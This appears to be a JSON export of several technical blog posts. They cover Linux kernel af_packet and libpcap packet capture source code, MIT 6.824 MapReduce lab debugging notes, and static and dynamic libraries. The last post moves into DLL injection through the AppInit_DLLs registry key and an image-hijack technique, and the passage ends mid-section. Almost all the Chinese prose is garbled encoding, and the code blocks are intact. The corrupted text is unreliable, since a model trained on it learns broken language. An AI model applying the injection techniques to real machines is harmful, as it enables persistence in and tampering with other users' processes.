sock_prot_inuse_add(net, \u0026amp;packet_proto, 1); preempt_enable(); return 0; out2: sk_free(sk); out: return err; } å¦‚typeæ³¨é‡Šæ‰€è¯´this is really htons(ether_type)\npacket_type ç»“æ„ä½“ç¬¬ä¸€ä¸ªtype å¾ˆé‡è¦ ï¼Œå¯¹åº”é“¾è·¯å±‚ä¸­2ä¸ªå­—èŠ‚çš„ä»¥å¤ªç½‘ç±»å‹ã€‚è€Œdev.c é“¾è·¯å±‚æŠ“å–çš„åŒ…ä¸ŠæŠ¥ç»™å¯¹åº”æ¨¡å—ï¼Œå°±æ˜¯æ ¹æ®æŠ“å–çš„é“¾è·¯å±‚ç±»å‹ï¼Œç„¶åç»™å¯¹åº”çš„æ¨¡å—å¤„ç†ï¼Œä¾‹å¦‚socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL)); ETH_P_ALLè¡¨ç¤ºæ‰€æœ‰çš„åº•å±‚åŒ…éƒ½ä¼šç»™åˆ°PF_PACKET æ¨¡å—çš„å¤„ç†å‡½æ•°ï¼Œè¿™é‡Œå¤„ç†å‡½æ•°å°±æ˜¯ packet_type.func ä¹Ÿå°±æ˜¯åœ¨packet_createä¸­è®¾ç½®çš„packet_rcvå‡½æ•°.\n1 2 3 4 5 6 7 8 9 static inline int deliver_skb(struct sk_buff *skb, struct packet_type *pt_prev, struct net_device *orig_dev) { if (unlikely(skb_orphan_frags_rx(skb, GFP_ATOMIC))) return -ENOMEM; refcount_inc(\u0026amp;skb-\u0026gt;users); return pt_prev-\u0026gt;func(skb, skb-\u0026gt;dev, pt_prev, orig_dev); } net/packet/af_packet.c/packet_rcv è€Œå¯¹äºpacket_rcv() æ³¨é‡Šæ˜¯This function makes lazy skb cloning in hope that most of packets are discarded by BPF.\næ‡’æ‹·è´ å¸Œæœ›å¤§éƒ¨åˆ†åŒ…èƒ½è¢«BPFä¸¢å¼ƒ\næ³¨é‡Šè¿˜æåˆ°å› ä¸ºpacketsæ˜¯ç”±dev_queue_xmit_nitå…‹éš†è€Œæ¥\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 /* * This function makes lazy skb cloning in hope that most of packets * are discarded by BPF. * * Note tricky part: we DO mangle shared skb! skb-\u0026gt;data, skb-\u0026gt;len * and skb-\u0026gt;cb are mangled. It works because (and until) packets * falling here are owned by current CPU. Output packets are cloned * by dev_queue_xmit_nit(), input packets are processed by net_bh * sequentially, so that if we return skb to original state on exit, * we will not harm anyone. */ static int packet_rcv(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) { struct sock *sk; struct sockaddr_ll *sll; struct packet_sock *po; u8 *skb_head = skb-\u0026gt;data; int skb_len = skb-\u0026gt;len; unsigned int snaplen, res; bool is_drop_n_account = false; if (skb-\u0026gt;pkt_type == PACKET_LOOPBACK) goto drop; sk = pt-\u0026gt;af_packet_priv; po = pkt_sk(sk); if (!net_eq(dev_net(dev), sock_net(sk))) goto drop; skb-\u0026gt;dev = dev; if (dev_has_header(dev)) { /* The device has an explicit notion of ll header, * exported to higher levels. * * Otherwise, the device hides details of its frame * structure, so that corresponding packet head is * never delivered to user. */ if (sk-\u0026gt;sk_type != SOCK_DGRAM) skb_push(skb, skb-\u0026gt;data - skb_mac_header(skb)); else if (skb-\u0026gt;pkt_type == PACKET_OUTGOING) { /* Special case: outgoing packets have ll header at head */ skb_pull(skb, skb_network_offset(skb)); } } snaplen = skb-\u0026gt;len; // æ ¹æ®è®¾ç½®çš„è¿‡æ»¤è§„åˆ™è¿‡æ»¤ res = run_filter(skb, sk, snaplen); if (!res) goto drop_n_restore; if (snaplen \u0026gt; res) snaplen = res; if (atomic_read(\u0026amp;sk-\u0026gt;sk_rmem_alloc) \u0026gt;= sk-\u0026gt;sk_rcvbuf) goto drop_n_acct; if (skb_shared(skb)) { struct sk_buff *nskb = skb_clone(skb, GFP_ATOMIC); if (nskb == NULL) goto drop_n_acct; if (skb_head != skb-\u0026gt;data) { skb-\u0026gt;data = skb_head; skb-\u0026gt;len = skb_len; } consume_skb(skb); skb = nskb; } sock_skb_cb_check_size(sizeof(*PACKET_SKB_CB(skb)) + MAX_ADDR_LEN - 8); sll = \u0026amp;PACKET_SKB_CB(skb)-\u0026gt;sa.ll; sll-\u0026gt;sll_hatype = dev-\u0026gt;type; sll-\u0026gt;sll_pkttype = skb-\u0026gt;pkt_type; if (unlikely(po-\u0026gt;origdev)) sll-\u0026gt;sll_ifindex = orig_dev-\u0026gt;ifindex; else sll-\u0026gt;sll_ifindex = dev-\u0026gt;ifindex; sll-\u0026gt;sll_halen = dev_parse_header(skb, sll-\u0026gt;sll_addr); /* sll-\u0026gt;sll_family and sll-\u0026gt;sll_protocol are set in packet_recvmsg(). * Use their space for storing the original skb length. */ PACKET_SKB_CB(skb)-\u0026gt;sa.origlen = skb-\u0026gt;len; if (pskb_trim(skb, snaplen)) goto drop_n_acct; skb_set_owner_r(skb, sk); skb-\u0026gt;dev = NULL; skb_dst_drop(skb); /* drop conntrack reference */ nf_reset_ct(skb); // æœ€åå°†åº•å±‚ç½‘å£ç¬¦åˆåº”ç”¨å±‚çš„æ•°æ®å¤åˆ¶åˆ°æ¥æ”¶ç¼“å­˜é˜Ÿåˆ—ä¸­ è¿™æ ·åº”ç”¨å±‚å°±å¾—åˆ°äº†ç½‘ç»œæµé‡ spin_lock(\u0026amp;sk-\u0026gt;sk_receive_queue.lock); po-\u0026gt;stats.stats1.tp_packets++; sock_skb_set_dropcount(sk, skb); __skb_queue_tail(\u0026amp;sk-\u0026gt;sk_receive_queue, skb); spin_unlock(\u0026amp;sk-\u0026gt;sk_receive_queue.lock); sk-\u0026gt;sk_data_ready(sk); return 0; drop_n_acct: is_drop_n_account = true; atomic_inc(\u0026amp;po-\u0026gt;tp_drops); atomic_inc(\u0026amp;sk-\u0026gt;sk_drops); drop_n_restore: if (skb_head != skb-\u0026gt;data \u0026amp;\u0026amp; skb_shared(skb)) { skb-\u0026gt;data = skb_head; skb-\u0026gt;len = skb_len; } drop: if (!is_drop_n_account) consume_skb(skb); else kfree_skb(skb); return 0; } net/packet/af_packet.c/packet_recvmsg åº”ç”¨å±‚åˆ›å»ºsocketï¼Œåº•å±‚ä¼šå…³è”ä¸Šè¿™ä¸ªsocketï¼Œä¸€æ—¦å…³è”ä¸Šé“¾è·¯å±‚æŠ“åˆ°çš„åŒ…å°±ä¼šcopyä¸€ä»½ç»™ä¸Šå±‚æ¥å£ï¼ˆå³PF_PACKET æ³¨å†Œçš„å›è°ƒå‡½æ•°packet_revï¼‰. è€Œå›è°ƒå‡½æ•°ä¼šæ ¹æ®åº”ç”¨å±‚è®¾ç½®çš„bpfè¿‡æ»¤æ•°æ®åŒ…ï¼Œæœ€ç»ˆæ”¾å…¥æ¥æ”¶ç¼“å­˜çš„æ•°æ®åŒ…è‚¯å®šæ˜¯ç¬¦åˆåº”ç”¨å±‚æƒ³æˆªå–çš„æ•°æ®ã€‚å› æ­¤æœ€åä¸€æ­¥recvfromä¹Ÿå°±æ˜¯ä»æ¥æ”¶ç¼“å­˜çš„æ•°æ®åŒ…copyç»™åº”ç”¨å±‚\nrecvfromçš„ç³»ç»Ÿè°ƒç”¨é“¾å¦‚ä¸‹\n__sys_recvfrom-\u0026gt;sock_recvmsg-\u0026gt;sk.ops.recvmsg\næ­¤å¤„çš„recvmsgå°±æ˜¯af_packet.cä¸­ç»‘å®šçš„packet_recvmsg\nè€Œpacket_recvmsgçš„å®˜æ–¹æ³¨é‡Šæ˜¯ Pull a packet from our receive queue and hand it to the user.\nä»æ¥æ”¶é˜Ÿåˆ—æ‹‰å–packetä¼ é€’ç»™ç”¨æˆ·\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 static const struct proto_ops packet_ops = { ... .recvmsg =\tpacket_recvmsg, .mmap =\tpacket_mmap, ... }; /* *\tPull a packet from our receive queue and hand it to the user. *\tIf necessary we block. */ static int packet_recvmsg(struct socket *sock, struct msghdr *msg, size_t len, int flags) { } recvfrom cap åˆ°è¿™é‡Œç”¨æˆ·åˆ›å»ºsocketç„¶åä½¿ç”¨recvfromç³»ç»Ÿè°ƒç”¨æŠ“å–ç½‘ç»œæµé‡çš„è¿‡ç¨‹ç»“æŸ\nå¯ä»¥çœ‹åˆ°è¿™ä¸ªç½‘ç»œæŠ“åŒ…æµç¨‹ç»å†äº†å¤šæ¬¡å†…å­˜æ‹·è´çš„è¿‡ç¨‹(ä»é“¾è·¯å±‚copyç»™ä¸Šå±‚æ¥å£ å†ä»æ¥æ”¶é˜Ÿåˆ—copyåˆ°ç”¨æˆ·ç©ºé—´)\nTo do pcap_activate_linux()ä¸­æ··æ‚æ¨¡å¼å’Œ\u0026quot;any\u0026quot; device 2020n1ctf W2L kernelpwn ChangeLog socket(PF_PACKET, SOCK_RAW/SOCK_DGRAM, htons(ETH_P_ALL))/socket(PF_INET, SOCK_PACKET, htons(ETH_P_ALL))\n0.9 live_open_new/live_open_old pcap_read_packet\u0026amp;recvfrom\n1.0 activate_new-\u0026gt;activate_mmap/active_old pcap_read_linux_mmap/pcap_read_packet\u0026amp;recvfrom\n1.9 activate_pf_packet/activate_sock_packet pcap_read_packet/pcap_read_linux_mmap_v1[_64]/2/3\trecvfrom\n1.10 activate_pf_packet\tpcap_read_linux_mmap_v2/3\n1.9æ·»åŠ DLT_LINUX_SLL2çš„support,1.10æ–°å¢DLT_LINUX_SLL2å¯¹cooked-mode capturesçš„æ”¯æŒ\n1.10\nRequire PF_PACKET support, and kernel 2.6.27 or later\nHandle systems without AF_INET or AF_UNIX socket support\nå¯ä»¥çœ‹åˆ°ç‰ˆæœ¬æ›´è¿­å·®åˆ«è¿˜æ˜¯æŒºå¤§çš„\nReference https://mp.weixin.qq.com/s/ZX8Jluh-RgJXcVh3OvycRQ[how tcpdump cap]\nhttps://blog.csdn.net/bie_niu1992/article/details/96435670[tcpdump-libpcap]\nhttps://zh.wikipedia.org/zh-hans/BPF[BPF]\nhttps://www.tcpdump.org/manpages/tcpdump.1.html[tcpdump man]\nhttps://www.compuquip.com/blog/tuning-ring-buffer-checkpoint-firewall[ring buffer]\nhttps://www.cnblogs.com/10087622blog/p/8320234.html[libpcap mmap]\nhttps://stackoverflow.com/questions/60736230/why-libpcap-is-better-than-sniffing-with-raw[libpcap better than raw socket]\nhttps://blog.csdn.net/gengzhikui1992/article/details/103142848[cap speed compare]\nhttp://blog.chinaunix.net/uid-23069658-id-3141409.html http://blog.chinaunix.net/uid-20357359-id-1963684.html\nhttps://zhuanlan.zhihu.com/p/345901595\n","description":"","id":17,"section":"posts","tags":["networking","kernel"],"title":"libpcapã€tcpdumpä»¥åŠkernel/netçš„éƒ¨åˆ†æºç é˜…è¯»","uri":"https://ruokeqx.gitee.io/posts/libpcaptcpdumpkernel-net%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"},{"content":"According to Collaboration Policy, detailed code will not be placed here.\nJust record the problems encountered during the lab.\nPre go env\n1 2 3 sudo apt install go go env -w GO111MODULE=on go env -w GOPROXY=https://goproxy.io,direct source code\n1 2 3 git clone git://g.csail.mit.edu/6.824-golabs-2020 6.824 cd 6.824 go mod init 6.824-lab Lab1:MapReduce å‰ç½®çŸ¥è¯†ï¼šGo \u0026amp; net/rpc\né¢˜ç›®ä¸­ src/mrapps/wc.go ä¸­æ˜¯å·²ç»å†™å¥½çš„Mapå’ŒReduceæ–¹æ³•\néœ€è¦åšçš„æ˜¯å¡«è¡¥ src/mr/master.goã€rpc.goã€worker.go\nå…¶ä¸­masterç”±mrmasterè°ƒç”¨ã€workerç”±mrworkerè°ƒç”¨\nå®Œæˆåˆ†å¸ƒå¼MapReduceçš„æ¶æ„è®¾è®¡å¹¶è§£å†³parallelismå’Œfault tolerant\n1 2 3 4 # è¿è¡Œæ–¹å¼ # åˆå§‹çŠ¶æ€ä¸‹ åæ³¨é‡Šworker.go ä¸­CallExample() å¯ä»¥å¾—åˆ°ç”¨rpcè°ƒç”¨çš„y=x+1 go run mrmaster.go pg-*.txt go run mrworker.go wc.so 1 2 3 4 5 cd src/main # modify src/mrapps/wc.go import \u0026#34;6.824-lab/src/mr\u0026#34; before build see [2] # by default, we replace all \u0026#34;../mr\u0026#34; with \u0026#34;6.824-lab/src/mr\u0026#34; go build -buildmode=plugin ../mrapps/wc.go go run mrsequential.go wc.so pg*.txt é—®é¢˜ Code é—®é¢˜1å’Œé—®é¢˜2éƒ½ä¸è¿™ä¸ªmasterå¤„ç†workerçš„ackå¤„ç†å‡½æ•°æœ‰å…³\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 // ä»»åŠ¡ç»“æŸ æ›´æ–°taskçŠ¶æ€ é‡æ–°è°ƒåº¦ func (m *Master) TaskCompleted(task *Task, reply *ExampleReply) error { // workerå¯èƒ½æ–­è¿åé‡æ–°è¿æ¥ // å¦‚æœæ˜¯workerå’Œmasteråœ¨ä¸åŒé˜¶æ®µ æˆ–è€… åœ¨ç›¸åŒé˜¶æ®µä½†taskçŠ¶æ€ä¸ºå·²å®Œæˆ // åˆ™ç›´æ¥è¿”å› è®©workerè®¤ä¸ºè‡ªå·±æäº¤æˆåŠŸ ç„¶åå°è¯•è·å–ä¸‹ä¸€ä¸ªä»»åŠ¡(å……åˆ†åˆ©ç”¨è®¡ç®—èµ„æº) if task.TaskState != m.MasterPhase || m.TaskMeta[task.TaskNumber].TaskStatus == Completed { return nil } m.mu.Lock() m.TaskMeta[task.TaskNumber].TaskStatus = Completed // æ­¤å¤„æ‰‹åŠ¨é‡Šæ”¾é” å¦åˆ™ä¸‹æ–¹å‡½æ•°ä¸­å°è¯•è·å–é”æ°¸è¿œå¤±è´¥ m.mu.Unlock() switch task.TaskState { case Map: // å°†è¯¥workerçš„nReduceä¸ªä¸´æ—¶æ–‡ä»¶è·¯å¾„æ”¾åˆ°å¯¹åº”reducerçš„æ–‡ä»¶åˆ—è¡¨ä¸­ for i := 0; i \u0026lt; task.NReducer; i++ { m.LocIntermediate[i] = append(m.LocIntermediate[i], task.Intermediates[i]) } // for _, v := range m.LocIntermediate { // fmt.Println(v) // } if m.allTaskDone() { // è¯¥å‡½æ•°é‡Œé¢ä¹Ÿå°è¯•ä¸Šé” ä½†æ˜¯å‰é¢å·²ç»ä¸Šé” å¯¼è‡´è¯¥å‡½æ•°é‡Œé¢æ°¸è¿œè·å–ä¸åˆ°é” æ‰€ä»¥ä¸€ç›´ç­‰å¾… m.createReduceTask() // fmt.Println(len(m.TaskQueue)) m.MasterPhase = Reduce } case Reduce: if m.allTaskDone() { m.MasterPhase = Exit } } return nil } 1åŒæ­¥é”é˜»å¡ é‡åˆ°mapperè¿‡ç¨‹ç»“æŸä½†æ˜¯å§‹ç»ˆæ²¡æœ‰è¿›å…¥reduceè¿‡ç¨‹çš„é—®é¢˜\nå°è¯•è¾“å‡ºä¸­é—´å€¼å‘ç°åˆ¤æ–­allTaskDone()ä¸ºtrueï¼Œä½†æ˜¯å°è¯•åœ¨createReduceTask()æ‰“å°\u0026quot;create reduce task\u0026quot;å­—æ ·å¤±è´¥\nåˆ†æå‘ç°è¯¥å‡½æ•°é‡Œé¢ä¹Ÿå°è¯•ä¸Šé” ä½†æ˜¯å¤–éƒ¨å‡½æ•°å·²ç»ä¸Šé” ç¼–è¾‘å®Œèµ„æºåä½¿ç”¨çš„æ˜¯defer unlock å¯¼è‡´è¯¥å‡½æ•°é‡Œé¢æ°¸è¿œè·å–ä¸åˆ°é” æ‰€ä»¥ä¸€ç›´ç­‰å¾…\nè§£å†³æ–¹æ³•æ˜¯å°†defer unlockæ”¹æˆunlock\n2crash test fail çœ‹äº†ä¸€ä¸‹æ˜¯killæ‰workeré‡å¯ï¼Œä¸»è¦è€ƒè™‘fault tolerant ä»»åŠ¡é‡å‘åŠdrop duplicated message\nè¦æœ‰æ£€æµ‹æœºåˆ¶ è¿‡æ—¶é‡ä¼ ä»»åŠ¡ ä½†æ˜¯å¦‚ä½•ä¿è¯ä¸­é—´æ–‡ä»¶å¹‚ç­‰å‘¢ï¼Ÿ\nä¸€ç§è§£å†³æ€è·¯æ˜¯workeréšæ„è¾“å‡ºï¼Œå‘master ackçš„æ—¶å€™masteråˆ¤æ–­ä»»åŠ¡æ˜¯å¦å·²ç»è¢«ack æ˜¯çš„è¯å°±ä¸¢å¼ƒæ‰workerä¼ è¿‡æ¥çš„åœ°å€ ä¸æ˜¯çš„è¯å°±å°†åœ°å€æ·»åŠ åˆ°ç»´æŠ¤çš„ä¸­é—´æ–‡ä»¶åˆ—è¡¨\næœ¬æ¥æ˜¯ä»¥æ¯æ¬¡appendçš„æ–¹å¼è¾“å‡ºåˆ°æŒ‡å®šçš„nreducerä¸ªæ–‡ä»¶ä¸­ï¼Œä½†æ˜¯è¿™æ ·å°±æ²¡æ³•ä¿è¯æŒä¹…åŒ–çš„ä¸­é—´æ–‡ä»¶æ˜¯å¹‚ç­‰çš„\nè§£å†³æ–¹æ¡ˆæ˜¯æ¯æ¬¡å†™æˆåŠŸåˆ°å¯¹åº”nReducerä¸ªæ–‡ä»¶ä¸­å†é€šçŸ¥å®Œæˆ\nä¿è¯è¾“å‡ºå¹‚ç­‰çš„è¯åªè¦æ¯æ¬¡å†™å…¥ä¸åŒçš„æ–‡ä»¶ å†™æˆåŠŸåå†è¿”å›æ–‡ä»¶åç»™masterå³å¯\nå› ä¸ºreducerå¹¶ä¸çŸ¥é“ç”±å¤šå°‘ä¸ªworker masterç»´æŠ¤çš„å¯¹åº”reducerçš„intermediateæ–‡ä»¶åˆ—è¡¨ä¹Ÿå¯ä»¥æ— é™é•¿\nè€Œä¸­é—´æ–‡ä»¶åä¹Ÿå¯ä»¥æ‘’å¼ƒåŸå…ˆintermediate[i]çš„å‘½åæ–¹å¼ç›´æ¥æ”¹æˆéšæœºå­—ç¬¦ä¸²\nworkerå¯èƒ½æ–­è¿åé‡æ–°è¿æ¥ å½“æœŸå®Œæˆä»–çš„ä»»åŠ¡å°†ç»“æœè¿”å›ç»™masterçš„æ—¶å€™ masteréœ€è¦è¿›è¡Œç‰¹æ®Šå¤„ç†\nå¦‚æœæ˜¯workerå’Œmasteråœ¨ä¸åŒé˜¶æ®µ æˆ–è€… åœ¨ç›¸åŒé˜¶æ®µä½†taskçŠ¶æ€ä¸ºå·²å®Œæˆ\nåˆ™ç›´æ¥è¿”å› è®©workerè®¤ä¸ºè‡ªå·±æäº¤æˆåŠŸ ç„¶åå°è¯•è·å–ä¸‹ä¸€ä¸ªä»»åŠ¡(å……åˆ†åˆ©ç”¨è®¡ç®—èµ„æº)\n3connection refused 1 dialing:dial unix /var/tmp/824-mr-0: connect: connection refused åŸå› æ˜¯master exitåworkerå°è¯•è¯·æ±‚masterå¤±è´¥\nåŸæœ¬è®¾ç½®çš„taskä¸º0è¿”å›waitåworker sleep 5å¤ªé•¿äº† ä¿®æ”¹ä¸ºsleep 1 ç„¶åmasterçŠ¶æ€exitåsleep 1åå†é€€å‡ºå°±è§£å†³é—®é¢˜äº†\nTest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 *** Starting wc test. 2022/03/11 13:07:44 rpc.Register: method \u0026#34;Done\u0026#34; has 1 input parameters; needs exactly three --- wc test: PASS *** Starting indexer test. 2022/03/11 13:07:50 rpc.Register: method \u0026#34;Done\u0026#34; has 1 input parameters; needs exactly three --- indexer test: PASS *** Starting map parallelism test. 2022/03/11 13:07:54 rpc.Register: method \u0026#34;Done\u0026#34; has 1 input parameters; needs exactly three --- map parallelism test: PASS *** Starting reduce parallelism test. 2022/03/11 13:08:02 rpc.Register: method \u0026#34;Done\u0026#34; has 1 input parameters; needs exactly three --- reduce parallelism test: PASS *** Starting crash test. 2022/03/11 13:08:11 rpc.Register: method \u0026#34;Done\u0026#34; has 1 input parameters; needs exactly three --- crash test: PASS *** PASSED ALL TESTS Ref [1] https://gitee.com/ruokeqx/mit6.824-lab [my code lib]\n[2] http://nil.csail.mit.edu/6.824/2020/labs/lab-mr.html [mr lab page]\n[3] https://github.com/golang/go/issues/26645 [cannot find module for path]\n[4] https://www.bookstack.cn/read/go-rpc-programming-guide/part1-gorpc.md [go rpc]\n[5] https://www.cnblogs.com/fydeblog/p/12826673.html\n","description":"","id":18,"section":"posts","tags":["course","Distributed System"],"title":"MIT 6.824 lab","uri":"https://ruokeqx.gitee.io/posts/mit6.824-lab/"},{"content":"static library and dynamic library é™æ€åº“ç©ºé—´æµªè´¹\né™æ€åº“å¯¹ç¨‹åºçš„æ›´æ–°ã€éƒ¨ç½²å’Œå‘å¸ƒé¡µä¼šå¸¦æ¥éº»çƒ¦\nåŠ¨æ€åº“åœ¨ç¨‹åºç¼–è¯‘æ—¶å¹¶ä¸ä¼šè¢«è¿æ¥åˆ°ç›®æ ‡ä»£ç ä¸­ï¼Œè€Œæ˜¯åœ¨ç¨‹åºè¿è¡Œæ˜¯æ‰è¢«è½½å…¥ã€‚ä¸åŒçš„åº”ç”¨ç¨‹åºå¦‚æœè°ƒç”¨ç›¸åŒçš„åº“ï¼Œé‚£ä¹ˆåœ¨å†…å­˜é‡Œåªéœ€è¦æœ‰ä¸€ä»½è¯¥å…±äº«åº“çš„å®ä¾‹ï¼Œè§„é¿äº†ç©ºé—´æµªè´¹é—®é¢˜ã€‚\nåœ¨Windowsç³»ç»Ÿä¸‹çš„æ‰§è¡Œæ–‡ä»¶æ ¼å¼æ˜¯PEæ ¼å¼ï¼ŒåŠ¨æ€åº“éœ€è¦ä¸€ä¸ªDllMainå‡½æ•°åšå‡ºåˆå§‹åŒ–çš„å…¥å£ï¼Œå¯¼å‡º extern \u0026ldquo;C\u0026rdquo; _declspec(dllexport) å¯¼å…¥ extern \u0026ldquo;C\u0026rdquo; _declspec(dllimport)\nLinuxä¸‹gccç¼–è¯‘çš„æ‰§è¡Œæ–‡ä»¶é»˜è®¤æ˜¯ELFæ ¼å¼ï¼Œä¸éœ€è¦åˆå§‹åŒ–å…¥å£ï¼Œäº¦ä¸éœ€è¦å‡½æ•°åšç‰¹åˆ«çš„å£°æ˜ï¼Œç¼–å†™æ¯”è¾ƒæ–¹ä¾¿ã€‚\né™æ€åº“å¯¹åº”çš„libæ–‡ä»¶å«é™æ€åº“ï¼ŒåŠ¨æ€åº“å¯¹åº”çš„libæ–‡ä»¶å«å¯¼å…¥åº“ã€‚å®é™…ä¸Šé™æ€åº“æœ¬èº«å°±åŒ…å«äº†å®é™…æ‰§è¡Œä»£ç ã€ç¬¦å·è¡¨ç­‰ç­‰ï¼Œè€Œå¯¹äºå¯¼å…¥åº“è€Œè¨€ï¼Œå…¶å®é™…çš„æ‰§è¡Œä»£ç ä½äºåŠ¨æ€åº“ä¸­ï¼Œå¯¼å…¥åº“åªåŒ…å«äº†åœ°å€ç¬¦å·è¡¨ç­‰ï¼Œç¡®ä¿ç¨‹åºæ‰¾åˆ°å¯¹åº”å‡½æ•°çš„ä¸€äº›åŸºæœ¬åœ°å€ä¿¡æ¯ã€‚\nLinux é™æ€é“¾æ¥åº“\n1 2 3 4 5 6 7 # gen StaticMath.o g++ -c StaticMath.cpp # gen libstaticmath.a ar -crv libstaticmath.a StaticMath.o # use libstaticmath.a g++ TestStaticLibrary.cpp -L../StaticLibrary -lstaticmath g++ TestStaticLibrary.cpp ../StaticLibrary/libstaticmath.a Windows é™æ€é“¾æ¥åº“\n1 2 3 4 5 6 7 8 # gen StaticMath.obj cl /c StaticMath.cpp # gen StaticMath.lib lib StaticMath.obj # å±æ€§é…ç½®-\u0026gt;å¸¸è§„-\u0026gt;é…ç½®ç±»å‹-\u0026gt;åº”ç”¨ç¨‹åº(.exe)/åŠ¨æ€åº“(.dll)/é™æ€åº“(.lib) # use StaticMath.lib # å¼•ç”¨ # å±æ€§é…ç½®-\u0026gt;é“¾æ¥å™¨-\u0026gt;[(å¸¸è§„-\u0026gt;é™„åŠ åº“ç›®å½•)\u0026amp;(è¾“å…¥-\u0026gt;é™„åŠ ä¾èµ–é¡¹ç›®)] or (å‘½ä»¤è¡Œ-\u0026gt;æ·»åŠ å®Œæ•´è·¯å¾„) Linux åŠ¨æ€é“¾æ¥åº“\n1 2 3 4 5 6 7 # -fPIC(position independent code) -shared å…±äº«åº“ g++ -fPIC -shared -o libdynmath.so DynamicMath.cpp # use libdynmath.so edit /etc/ld.so.conf.d/ ## or sudo cp libdynmath.so /usr/lib g++ TestDynamicLibrary.cpp -L../DynamicLibrary -ldynmath Windows åŠ¨æ€é“¾æ¥åº“\n1 2 #include \u0026#34;DynamicMath.h\u0026#34; DynamicMath::add(a, b) æ˜¾å¼è°ƒç”¨\n1 2 3 4 5 6 7 8 9 10 11 12 13 # linux #include \u0026lt;dlfcn.h\u0026gt; void * dlopen( const char * pathname, int mode ) void* dlsym(void* handle,const char* symbol)\t# å‡½æ•°åœ°å€åŠå˜é‡åœ°å€ int dlclose (void *handle) # win #LoadLibraryåŠ è½½DLLã€GetProcAddressè·å–å¯¼å‡ºå‡½æ•°çš„å‡½æ•°æŒ‡é’ˆã€ç”¨å®ŒFreeLibrary HMODULE hMod = LoadLibrary(DLLè·¯å¾„) typedef int(*ADD_IMPORT) (int a,int b); ADD_IMPORT add_proc = (ADD_IMPORT) GetProcAddress(hMod,\u0026#34;Add\u0026#34;); int result = add_proc(1,2); å› ä¸ºC++çš„name manglingï¼Œç”¨extern \u0026ldquo;C\u0026quot;å£°æ˜[éæˆå‘˜]å‡½æ•° ä½¿ç”¨å‡½æ•°åä½œç¬¦å·å\nDll injection dllæ³¨å…¥å³æ˜¯è®©ç¨‹åºAå¼ºè¡ŒåŠ è½½ç¨‹åºBç»™å®šçš„a.dllï¼Œå¹¶æ‰§è¡Œç¨‹åºBç»™å®šçš„a.dllé‡Œé¢çš„ä»£ç ã€‚\nåº”ç”¨ç¨‹åºä¸€èˆ¬ä¼šåœ¨ä»¥ä¸‹æƒ…å†µä½¿ç”¨dllæ³¨å…¥æŠ€æœ¯æ¥å®ŒæˆæŸäº›åŠŸèƒ½ï¼š\n1.ä¸ºç›®æ ‡è¿›ç¨‹æ·»åŠ æ–°çš„â€œå®ç”¨â€åŠŸèƒ½ï¼›\n2.éœ€è¦ä¸€äº›æ‰‹æ®µæ¥è¾…åŠ©è°ƒè¯•è¢«æ³¨å…¥dllçš„è¿›ç¨‹ï¼›\n3.ä¸ºç›®æ ‡è¿›ç¨‹å®‰è£…é’©å­ç¨‹åº(API Hook)ï¼›\næ³¨å…¥dllçš„åŸåˆ™æ˜¯å€¼åœ¨éœ€è¦çš„æ—¶é—´æ‰æ³¨å…¥æˆ‘ä»¬çš„dllï¼Œå¹¶åœ¨ä¸éœ€è¦æ—¶åŠæ—¶å¸è½½ã€‚\nInjecting DLL with remote thread context patching\næ³¨å†Œè¡¨ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\nä¸­AppInit_DLLsé”®çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªdllçš„æ–‡ä»¶åæˆ–ä¸€ç»„dllçš„æ–‡ä»¶å(é€šè¿‡é€—å·æˆ–ç©ºæ ¼æ¥åˆ†éš”)\nLoadAppInit_DLLsä¸º1æ—¶è¡¨ç¤ºAppInit_DLLsé”®æœ‰æ•ˆ\nè¿™ä¸¤ä¸ªé”®å€¼è®¾å®šåï¼Œå½“åº”ç”¨ç¨‹åºå¯åŠ¨å¹¶åŠ è½½User32.dllæ—¶ï¼Œä¼šè·å¾—ä¸Šè¿°æ³¨å†Œè¡¨é”®çš„å€¼ï¼Œå¹¶è°ƒç”¨LoadLibraryæ¥è°ƒç”¨è¿™äº›å­—ç¬¦ä¸²ä¸­æŒ‡å®šçš„æ¯ä¸€ä¸ªdllã€‚è¿™æ—¶æ¯ä¸ªè¢«è½½å…¥çš„dllå¯ä»¥å®Œæˆç›¸åº”çš„åˆå§‹åŒ–å·¥ä½œã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºè¢«æ³¨å…¥çš„dllæ˜¯åœ¨è¿›ç¨‹ç”Ÿå‘½æœŸçš„æ—©æœŸè¢«è½½å…¥çš„ï¼Œå› æ­¤è¿™äº›dllåœ¨è°ƒç”¨å‡½æ•°æ—¶åº”æ…é‡ã€‚è°ƒç”¨Kernel32.dllä¸­çš„å‡½æ•°åº”è¯¥æ²¡æœ‰é—®é¢˜ï¼Œå› ä¸ºKernel32.dllæ˜¯åœ¨User32.dllè½½å…¥å‰å·²è¢«åŠ è½½ã€‚ä½†æ˜¯è°ƒç”¨å…¶ä»–çš„dllä¸­çš„å‡½æ•°æ—¶åº”å½“æ³¨æ„ï¼Œå› ä¸ºè¿›ç¨‹å¯èƒ½è¿˜æœªè½½å…¥ç›¸åº”çš„dllï¼Œä¸¥é‡æ—¶å¯èƒ½ä¼šå¯¼è‡´è“å±ã€‚\nImage hijack Image File Execution 